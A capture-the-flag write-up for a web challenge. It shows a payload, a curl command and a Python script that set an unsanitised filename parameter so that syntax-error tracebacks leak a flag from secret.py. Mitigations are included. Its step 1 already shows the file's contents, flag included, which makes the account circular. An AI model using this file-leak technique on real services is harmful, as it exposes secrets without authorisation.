**Writeup: CTF Challenge - Online Python Editor**

**Challenge Name:** Online Python Editor  
**Category:** Web Exploitation  
**Difficulty:** Medium  
**Flag:** `TRX{4ll_y0u_h4v3_t0_d0_1s_l00k_4t_th3_s0urc3_c0d3}`

---

### **Challenge Analysis**
A web application provides a Python syntax checker endpoint (`/check`) that uses `ast.parse()`. The server contains a `secret.py` file with the flag, which we need to extract through error message leakage.

---

### **Key Vulnerabilities**
1. **Filename Parameter Control**  
   The `filename` parameter in the JSON payload isn't sanitized, allowing path specification.
   
2. **Error Message Leakage**  
   Syntax errors return tracebacks showing code context from the specified file.

---

### **Exploit Strategy**
1. **Force Error Context Leakage**  
   Craft a payload that triggers a syntax error at the exact line where `FLAG` is declared in `secret.py`.

2. **Structure Mirroring**  
   Replicate `secret.py`'s code structure up to the flag declaration line to align error positions.

---

### **Step-by-Step Exploit**

#### 1. Analyze `secret.py` Structure
```python
def main():
    print("Here's the flag: ")
    print(FLAG) 
    
FLAG = "TRX{4ll_y0u_h4v3_t0_d0_1s_l00k_4t_th3_s0urc3_c0d3}"

main()
```

#### 2. Craft Malicious Payload
```python
{
    "source": (
        "def main():\n"
        "    print(\"Here's the flag: \")\n"
        "    print(FLAG)\n\n"
        "FLAG = \"\"\n"  # Valid syntax up to line 4
        "invalid syntax"  # Force error at line 5
    ),
    "filename": "secret.py"
}
```

#### 3. Send Payload to Endpoint
```bash
curl -X POST http://python.ctf.theromanxpl0.it:7001/check \
     -H "Content-Type: application/json" \
     -d '{"source":"def main():\n    print(\"Here\'s the flag: \")\n    print(FLAG)\n\nFLAG = \"\"\ninvalid syntax","filename":"secret.py"}'
```

#### 4. Analyze Error Response
The server returns:
```
  File "secret.py", line 5
    invalid syntax
    ^
SyntaxError: invalid syntax
```

**Surrounding Context:**
```
3│    print(FLAG)
4│    
5│FLAG = "TRX{4ll_y0u_h4v3_t0_d0_1s_l00k_4t_th3_s0urc3_c0d3}"
```

---

### **Automated Exploit Script**
```python
import requests
import re

TARGET_URL = "http://python.ctf.theromanxpl0.it:7001/check"

payload = {
    "source": (
        "def main():\n"
        "    print(\"Here's the flag: \")\n"
        "    print(FLAG)\n\n"
        "FLAG = \"\"\n"
        "invalid syntax"
    ),
    "filename": "secret.py"
}

response = requests.post(TARGET_URL, json=payload)
error = response.json().get("error", "")

flag_match = re.search(r'FLAG = "(TRX{.*?})"', error)
print(f"Captured Flag: {flag_match.group(1)}") if flag_match else print("Exploit failed")
```

---

### **Why This Works**
- **Filename Poisoning:** Forces error traceback to reference `secret.py`
- **Line Alignment:** Matches code structure to expose the flag line
- **Error Context:** Flask's debug mode shows 3-5 lines around errors

---

### **Mitigation Recommendations**
1. **Sanitize Filename Inputs**  
   Restrict filenames to safe values.
   
2. **Disable Debug Mode**  
   Prevent detailed error messages in production.

3. **Sandbox Code Analysis**  
   Use isolated environments for parsing untrusted code.

---

**Flag Captured:** `TRX{4ll_y0u_h4v3_t0_d0_1s_l00k_4t_th3_s0urc3_c0d3}`

This challenge demonstrates the importance of proper error handling and input validation in web applications. Always sanitize user-controlled parameters that interact with file systems!